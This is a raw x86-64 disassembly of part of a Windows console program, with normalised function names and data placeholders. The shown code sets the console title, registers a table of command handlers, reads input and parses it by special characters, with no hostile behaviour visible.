mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x30
mov [ rsp + 0x60 ] rbx
add rdi 0x30
jmp r-xdata
mov eax [ rdi ]
mov [ rbx ] eax
mov eax [ rdi + 0x4 ]
mov [ rbx + 0x4 ] eax
lea rcx [ rbx + 0x8 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x8 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
cmp rdi rsi
je r-xdata
sub_140012a60
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x58
mov [ rsp + 0x60 ] rbx
add rdi 0x58
jmp r-xdata
mov eax [ rdi ]
mov [ rbx ] eax
mov eax [ rdi + 0x4 ]
mov [ rbx + 0x4 ] eax
lea rcx [ rbx + 0x8 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x8 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
lea rcx [ rbx + 0x30 ]
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
lea rdx [ rdi + 0x30 ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
nop
cmp rdi rsi
je r-xdata
sub_140012b20
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
lea rdx [ r--data ]
xor ecx ecx
call sub_14003ce60
call sub_14003bc4c
mov rcx rax
call sub_14003be60
mov ecx eax
mov edx 0x40000
call sub_14003bf88
call sub_14003bc4c
lea rcx [ rax + 0x30 ]
call sub_14003be60
mov ecx eax
mov edx 0x40000
call sub_14003bf88
call sub_14003bc4c
lea rcx [ rax + 0x60 ]
call sub_14003be60
mov ecx eax
mov edx 0x40000
call sub_14003bf88
mov ecx 0x30
call sub_14003ac60
mov [ rsp + 0x50 ] rax
test rax rax
je r-xdata
xor ecx ecx
mov rcx rax
call sub_140013530
mov rcx rax
jmp r-xdata
xor eax eax
add rsp 0x38
retn
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
test rcx rcx
je r-xdata
sub_140012bd0
mov rax rsp
push rbp
lea rbp [ rax - 0x5d8 ]
sub rsp 0x6d0
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x5c0 ] rax
mov rbx rcx
mov edi 0x7
mov [ rbp + 0x28 ] rdi
xor esi esi
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x10 ] si
mov [ rbp + 0x50 ] rdi
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x38 ] si
xor r8d r8d
lea edx [ rdi + 0x1 ]
lea rcx [ rbp + 0x38 ]
call sub_1400025a0
lea r11 [ rbp + 0x38 ]
cmp [ rbp + 0x50 ] 0x8
cmovae r11 [ rbp + 0x38 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov [ rbp + 0x48 ] 0x8
lea rax [ rbp + 0x38 ]
cmp [ rbp + 0x50 ] 0x8
cmovae rax [ rbp + 0x38 ]
mov [ rax + 0x10 ] si
lea rcx [ rbp + 0x60 ]
call sub_14002d090
nop
add rbx 0x8
lea rdx [ rbp + 0x10 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x60 ] si
mov rcx [ r--data ]
mov [ rbp - 0x60 ] rcx
mov eax [ r--data ]
mov [ rbp - 0x58 ] eax
mov [ rbp - 0x50 ] 0x6
lea rax [ rbp - 0x60 ]
cmp rdi 0x8
cmovae rax rcx
mov [ rax + 0xc ] si
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x28 ] rsi
mov [ rbp - 0x38 ] si
xor r8d r8d
lea edx [ rdi + 0x15 ]
lea rcx [ rbp - 0x38 ]
call sub_1400025a0
lea r11 [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x8
cmovae r11 [ rbp - 0x38 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov [ rbp - 0x28 ] 0x1c
lea rax [ rbp - 0x38 ]
cmp [ rbp - 0x20 ] 0x8
cmovae rax [ rbp - 0x38 ]
mov [ rax + 0x38 ] si
lea rcx [ rbp - 0x10 ]
call sub_140015680
nop
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140014cb0
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x30 ] si
mov rcx [ r--data ]
mov [ rsp + 0x30 ] rcx
mov eax [ r--data ]
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x40 ] 0x6
lea rax [ rsp + 0x30 ]
cmp rdi 0x8
cmovae rax rcx
mov [ rax + 0xc ] si
mov [ rsp + 0x70 ] rdi
mov [ rsp + 0x68 ] rsi
mov [ rsp + 0x58 ] si
xor r8d r8d
lea edx [ rdi + 0x8 ]
lea rcx [ rsp + 0x58 ]
call sub_1400025a0
lea r11 [ rsp + 0x58 ]
cmp [ rsp + 0x70 ] 0x8
cmovae r11 [ rsp + 0x58 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov eax [ r--data ]
mov [ r11 + 0x18 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x1c ] ax
mov [ rsp + 0x68 ] 0xf
lea rax [ rsp + 0x58 ]
cmp [ rsp + 0x70 ] 0x8
cmovae rax [ rsp + 0x58 ]
mov [ rax + 0x1e ] si
lea rcx [ rbp - 0x80 ]
call sub_14002de70
nop
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x568 ] rdi
mov [ rbp + 0x560 ] rsi
mov [ rbp + 0x550 ] si
mov r8d edi
lea rdx [ r--data ]
lea rcx [ rbp + 0x550 ]
call sub_140001ea0
nop
mov [ rbp + 0x590 ] rdi
mov [ rbp + 0x588 ] rsi
mov [ rbp + 0x578 ] si
lea r8d [ rdi + 0x13 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x578 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x5a0 ]
call sub_140024750
nop
lea rdx [ rbp + 0x550 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x488 ] rdi
mov [ rbp + 0x480 ] rsi
mov [ rbp + 0x470 ] si
lea r8d [ rdi - 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x470 ]
call sub_140001ea0
nop
mov [ rbp + 0x4b0 ] rdi
mov [ rbp + 0x4a8 ] rsi
mov [ rbp + 0x498 ] si
lea r8d [ rdi + 0x11 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x498 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x4c0 ]
call sub_140030720
nop
lea rdx [ rbp + 0x470 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x3a8 ] rdi
mov [ rbp + 0x3a0 ] rsi
mov [ rbp + 0x390 ] si
mov r8d edi
lea rdx [ r--data ]
lea rcx [ rbp + 0x390 ]
call sub_140001ea0
nop
mov [ rbp + 0x3d0 ] rdi
mov [ rbp + 0x3c8 ] rsi
mov [ rbp + 0x3b8 ] si
lea r8d [ rdi + 0x12 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x3b8 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x3e0 ]
call sub_14002be50
nop
lea rdx [ rbp + 0x390 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x2c8 ] rdi
mov [ rbp + 0x2c0 ] rsi
mov [ rbp + 0x2b0 ] si
lea r8d [ rdi + 0x2 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x2b0 ]
call sub_140001ea0
nop
mov [ rbp + 0x2f0 ] rdi
mov [ rbp + 0x2e8 ] rsi
mov [ rbp + 0x2d8 ] si
lea r8d [ rdi + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x2d8 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x300 ]
call sub_140023350
nop
lea rdx [ rbp + 0x2b0 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x1e8 ] rdi
mov [ rbp + 0x1e0 ] rsi
mov [ rbp + 0x1d0 ] si
lea r8d [ rdi - 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1d0 ]
call sub_140001ea0
nop
mov [ rbp + 0x210 ] rdi
mov [ rbp + 0x208 ] rsi
mov [ rbp + 0x1f8 ] si
lea r8d [ rdi + 0x11 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x1f8 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x220 ]
call sub_14001aef0
nop
lea rdx [ rbp + 0x1d0 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x108 ] rdi
mov [ rbp + 0x100 ] rsi
mov [ rbp + 0xf0 ] si
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
mov [ rbp + 0x130 ] rdi
mov [ rbp + 0x128 ] rsi
mov [ rbp + 0x118 ] si
lea r8d [ rdi + 0x14 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x118 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x140 ]
call sub_14002bbe0
nop
lea rdx [ rbp + 0xf0 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x338 ] rdi
mov [ rbp + 0x330 ] rsi
mov [ rbp + 0x320 ] si
mov r8d edi
lea rdx [ r--data ]
lea rcx [ rbp + 0x320 ]
call sub_140001ea0
nop
mov [ rbp + 0x360 ] rdi
mov [ rbp + 0x358 ] rsi
mov [ rbp + 0x348 ] si
lea r8d [ rdi + 0x11 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x348 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x370 ]
call sub_1400317a0
nop
lea rdx [ rbp + 0x320 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x418 ] rdi
mov [ rbp + 0x410 ] rsi
mov [ rbp + 0x400 ] si
lea r8d [ rdi - 0x2 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x400 ]
call sub_140001ea0
nop
mov [ rbp + 0x440 ] rdi
mov [ rbp + 0x438 ] rsi
mov [ rbp + 0x428 ] si
lea r8d [ rdi + 0x12 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x428 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x450 ]
call sub_140021ab0
nop
lea rdx [ rbp + 0x400 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x98 ] rdi
mov [ rbp + 0x90 ] rsi
mov [ rbp + 0x80 ] si
mov r8d edi
lea rdx [ r--data ]
lea rcx [ rbp + 0x80 ]
call sub_140001ea0
nop
mov [ rbp + 0xc0 ] rdi
mov [ rbp + 0xb8 ] rsi
mov [ rbp + 0xa8 ] si
lea r8d [ rdi + 0x4 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xa8 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0xd0 ]
call sub_140027300
nop
lea rdx [ rbp + 0x80 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x4f8 ] rdi
mov [ rbp + 0x4f0 ] rsi
mov [ rbp + 0x4e0 ] si
lea r8d [ rdi - 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x4e0 ]
call sub_140001ea0
nop
mov [ rbp + 0x520 ] rdi
mov [ rbp + 0x518 ] rsi
mov [ rbp + 0x508 ] si
lea r8d [ rdi + 0x10 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x508 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x530 ]
call sub_14001c890
nop
lea rdx [ rbp + 0x4e0 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x178 ] rdi
mov [ rbp + 0x170 ] rsi
mov [ rbp + 0x160 ] si
lea r8d [ rdi - 0x5 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x160 ]
call sub_140001ea0
nop
mov [ rbp + 0x1a0 ] rdi
mov [ rbp + 0x198 ] rsi
mov [ rbp + 0x188 ] si
lea r8d [ rdi + 0x8 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x188 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x1b0 ]
call sub_14002e370
nop
lea rdx [ rbp + 0x160 ]
mov rcx rbx
call sub_140014cb0
mov [ rbp + 0x258 ] rdi
mov [ rbp + 0x250 ] rsi
mov [ rbp + 0x240 ] si
lea r8d [ rdi - 0x1 ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x240 ]
call sub_140001ea0
nop
mov [ rbp + 0x280 ] rdi
mov [ rbp + 0x278 ] rsi
mov [ rbp + 0x268 ] si
lea r8d [ rdi + 0x4d ]
lea rdx [ r--data ]
lea rcx [ rbp + 0x268 ]
call sub_140001ea0
nop
lea rcx [ rbp + 0x290 ]
call sub_140019080
nop
lea rdx [ rbp + 0x240 ]
mov rcx rbx
call sub_140014cb0
nop
lea rcx [ rbp + 0x240 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x160 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x4e0 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x80 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x400 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x320 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0xf0 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x1d0 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x2b0 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x390 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x470 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x550 ]
call sub_1400134b0
nop
lea rcx [ rsp + 0x30 ]
call sub_1400134b0
nop
lea rcx [ rbp - 0x60 ]
call sub_1400134b0
nop
lea rcx [ rbp + 0x10 ]
call sub_1400134b0
mov al 0x1
mov rcx [ rbp + 0x5c0 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x6d0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
sub_1400134b0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x50 ]
test rcx rcx
je r-xdata
xor edi edi
mov [ rbx + 0x50 ] rdi
mov [ rbx + 0x58 ] rdi
mov [ rbx + 0x60 ] rdi
cmp [ rbx + 0x40 ] 0x8
jb r-xdata
mov rdx [ rbx + 0x58 ]
call sub_1400150b0
mov rcx [ rbx + 0x50 ]
call j_sub_14003ad04
mov [ rbx + 0x40 ] 0x7
mov [ rbx + 0x38 ] rdi
mov [ rbx + 0x28 ] di
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbx + 0x28 ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rdi
mov [ rbx ] di
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
call j_sub_14003ad04
sub_140013530
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x88 ] rbx
mov r12 rcx
lea rax [ r--data ]
mov [ rcx ] rax
xor r13d r13d
mov [ rcx + 0x8 ] r13
mov [ rcx + 0x10 ] r13
mov [ rcx + 0x18 ] r13
mov [ rcx + 0x28 ] r13
call sub_140012bd0
lea rcx [ r--data ]
call [ SetConsoleTitleW@IAT ]
lea ebx [ r13 + 0x20 ]
lea rdx [ r--data ]
lea r14 [ rw-data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
movzx edx bx
call sub_14000fe50
mov rcx rax
lea rdx [ r--data ]
call sub_140004ed0
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
lea rdx [ r--data ]
mov rcx rax
call sub_14000ac10
mov rcx rax
call sub_140007970
lea ecx [ rbx + 0x8 ]
call sub_14003ac60
mov rsi rax
test rax rax
je r-xdata
mov rsi r13
mov [ rax + 0x18 ] 0x7
mov [ rax + 0x10 ] r13
mov [ rax ] r13w
jmp r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r14
test ebx ebx
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx edi
mov rax [ rw-data ]
mov edi 0x4
lea r15 [ rw-data ]
nop [ rax + rax ] eax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov r11 rax
test rax rax
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rax ]
movsxd rax [ rax + 0x4 ]
add rax r11
mov rax r13
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
mov rax [ rbp ]
mov dl 0xa
mov rcx rbp
call [ rax + 0x50 ]
movzx r8d ax
mov rdx rsi
mov rcx r15
call sub_140007550
mov rdx rsi
mov rcx r12
call sub_1400138b0
test al al
mov edi 0x4
jne r-xdata
xor edx edx
lea rcx [ rsp + 0x78 ]
call sub_14003825c
mov rax [ rdi + 0x8 ]
test rax rax
je r-xdata
and [ rax + 0x18 ] 0xfffff3ff
or [ rax + 0x18 ] 0x200
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
add rcx r15
lea rdx [ rsp + 0x80 ]
call sub_140003240
nop
mov rcx rax
call sub_140004d80
mov rbp rax
mov rdi [ rsp + 0x80 ]
test rdi rdi
je r-xdata
mov edx 0xa
mov rcx r14
call sub_1400085e0
mov ebx r13d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
test rsi rsi
je r-xdata
mov rbx r13
cmp [ rdi + 0x8 ] rbx
cmove rbx rdi
lea rcx [ rsp + 0x78 ]
call sub_14003828c
test rbx rbx
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rax r12
mov rbx [ rsp + 0x88 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rsi + 0x18 ] 0x8
jb r-xdata
mov rax [ rbx ]
mov edx 0x1
mov rcx rbx
call [ rax ]
dec rax
mov [ rdi + 0x8 ] rax
mov [ rsi + 0x18 ] 0x7
mov [ rsi + 0x10 ] r13
mov [ rsi ] r13w
mov rcx rsi
call j_sub_14003ad04
nop
jmp r-xdata
mov rcx [ rsi ]
call j_sub_14003ad04
sub_1400137e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_140013810
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140013810
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rcx
lea rax [ r--data ]
mov [ rcx ] rax
xor edi edi
cmp [ rw-data ] rdi
je r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
mov [ rbx + 0x8 ] rdi
mov [ rbx + 0x10 ] rdi
mov [ rbx + 0x18 ] rdi
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
mov rdx [ rbx + 0x10 ]
call sub_140015130
mov rcx [ rbx + 0x8 ]
call j_sub_14003ad04
mov [ rw-data ] rdi
mov rax [ rcx ]
lea edx [ rdi + 0x1 ]
call [ rax ]
sub_1400138b0
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x40 ]
sub rsp 0x140
mov [ rsp + 0x60 ] 0xfffffffffffffffe
mov [ rsp + 0x180 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x30 ] rax
mov rdi rdx
mov r12 rcx
cmp [ rdx + 0x10 ] 0x0
sete al
test al al
jne r-xdata
mov rcx [ rbp + 0x30 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x180 ]
add rsp 0x140
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
mov rax rdx
mov rax [ rdx ]
jmp r-xdata
or r9 0xffffffffffffffff
lea r8d [ r9 + 0x2 ]
lea rdx [ rbp + 0x8 ]
mov rcx rdi
call sub_140006e20
nop
mov rdx rax
mov rcx r12
call sub_1400144a0
movzx ebx al
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
cmp eax 0x2a
je r-xdata
movzx eax [ rax ]
cmp eax 0x21
je r-xdata
movzx eax bl
mov rcx [ rbp + 0x8 ]
or r9 0xffffffffffffffff
lea r8d [ r9 + 0x2 ]
lea rdx [ rbp - 0x20 ]
mov rcx rdi
call sub_140006e20
nop
mov rcx rax
call sub_1400146a0
movzx ebx al
cmp [ rbp - 0x8 ] 0x8
jb r-xdata
cmp eax 0x40
je r-xdata
mov rcx [ rbp - 0x20 ]
jmp r-xdata
mov [ rbp - 0x80 ] 0x7
xor r13d r13d
mov [ rsp + 0x78 ] r13
mov [ rsp + 0x68 ] r13w
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x68 ]
call sub_140001dd0
nop
mov [ rsp + 0x20 ] r13
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x30 ] r13
lea rcx [ rsp + 0x68 ]
call sub_140014b90
mov rsi rax
cmp rax 0xffffffffffffffff
je r-xdata
call j_sub_14003ad04
lea r8 [ rsp + 0x20 ]
lea rdx [ rsp + 0x68 ]
mov rcx r12
call sub_140013c10
movzx esi al
mov rbx [ rsp + 0x20 ]
test rbx rbx
je r-xdata
mov r9 rax
xor r8d r8d
lea rdx [ rbp - 0x48 ]
lea rcx [ rsp + 0x68 ]
call sub_140006e20
mov rbx rax
lea rax [ rsp + 0x68 ]
cmp rax rbx
je r-xdata
mov [ rsp + 0x20 ] r13
mov [ rsp + 0x28 ] r13
mov [ rsp + 0x30 ] r13
cmp [ rbp - 0x80 ] 0x8
jb r-xdata
mov rdi [ rsp + 0x28 ]
cmp rbx rdi
je r-xdata
cmp [ rbp - 0x30 ] 0x8
jb r-xdata
cmp [ rbp - 0x80 ] 0x8
jb r-xdata
movzx eax sil
jmp r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
mov rcx rbx
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbp - 0x30 ] 0x7
mov [ rbp - 0x38 ] r13
mov [ rbp - 0x48 ] r13w
lea r8 [ rsi + 0x1 ]
or r9 0xffffffffffffffff
lea rdx [ rbp - 0x70 ]
mov rcx rdi
call sub_140006e20
nop
mov rdx rax
lea rcx [ rsp + 0x40 ]
call sub_140006b00
mov rbx rax
lea rax [ rsp + 0x20 ]
cmp rax rbx
je r-xdata
mov rcx [ rbp - 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x80 ] 0x7
mov [ rsp + 0x78 ] r13
mov [ rsp + 0x68 ] r13w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rsp + 0x68 ]
call j_sub_14003ad04
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
lea rcx [ rsp + 0x20 ]
call sub_1400070d0
mov r11 [ rbx ]
mov [ rsp + 0x20 ] r11
mov rax [ rbx + 0x8 ]
mov [ rsp + 0x28 ] rax
mov rax [ rbx + 0x10 ]
mov [ rsp + 0x30 ] rax
mov [ rbx ] r13
mov [ rbx + 0x8 ] r13
mov [ rbx + 0x10 ] r13
mov rax [ rbx ]
mov [ rsp + 0x68 ] rax
mov [ rbx ] r13
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rsp + 0x68 ]
call sub_14003a8c0
jmp r-xdata
mov rbx [ rsp + 0x20 ]
mov [ rsp + 0x40 ] r13
mov [ rsp + 0x48 ] r13
mov [ rsp + 0x50 ] r13
cmp [ rbp - 0x58 ] 0x8
jb r-xdata
mov rdi [ rsp + 0x48 ]
cmp rbx rdi
je r-xdata
mov rax [ rbx + 0x10 ]
mov [ rsp + 0x78 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x80 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
mov [ rbp - 0x58 ] 0x7
mov [ rbp - 0x60 ] r13
mov [ rbp - 0x70 ] r13w
mov rcx [ rbp - 0x70 ]
call j_sub_14003ad04
mov rcx rbx
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
mov rbx [ rsp + 0x40 ]
sub_140013c10
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x27 ]
sub rsp 0xb0
mov [ rbp - 0x69 ] 0xfffffffffffffffe
mov [ rsp + 0x108 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x17 ] rax
mov r15 r8
mov rdi rdx
mov r14 rcx
mov r8d 0x2
lea rdx [ r--data ]
mov rcx rdi
call sub_140014d70
mov rsi rax
mov [ rbp - 0x21 ] 0x7
xor r13d r13d
mov [ rbp - 0x29 ] r13
mov [ rbp - 0x39 ] r13w
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r13
mov [ rbp - 0x61 ] r13w
or r12 0xffffffffffffffff
mov r9 r12
xor r8d r8d
mov rdx rdi
lea rcx [ rbp - 0x61 ]
call sub_140001dd0
nop
cmp rsi r12
je r-xdata
mov rbx [ r14 + 0x8 ]
mov rax [ r14 + 0x10 ]
cmp rbx rax
je r-xdata
mov r9 rsi
xor r8d r8d
lea rdx [ rbp - 0x11 ]
mov rcx rdi
call sub_140006e20
mov rbx rax
lea rax [ rbp - 0x39 ]
cmp rax rbx
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x39 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rdi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebx r13d
mov rcx [ rdi ]
movsxd rcx [ rcx + 0x4 ]
mov r13d 0x4
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov r11 [ rbp - 0x21 ]
mov rsi [ rbp - 0x29 ]
mov rdi [ rbp - 0x39 ]
nop [ rax + rax ] ax
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx r13d
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
lea r8 [ rsi + 0x2 ]
mov r9 r12
lea rdx [ rbp - 0x11 ]
mov rcx rdi
call sub_140006e20
mov rbx rax
lea rax [ rbp - 0x61 ]
cmp rax rbx
je r-xdata
mov rcx [ rbp - 0x11 ]
call j_sub_14003ad04
mov [ rbp - 0x21 ] 0x7
mov [ rbp - 0x29 ] r13
mov [ rbp - 0x39 ] r13w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_14003ad04
mov edx 0xa
mov rcx rdi
call sub_1400085e0
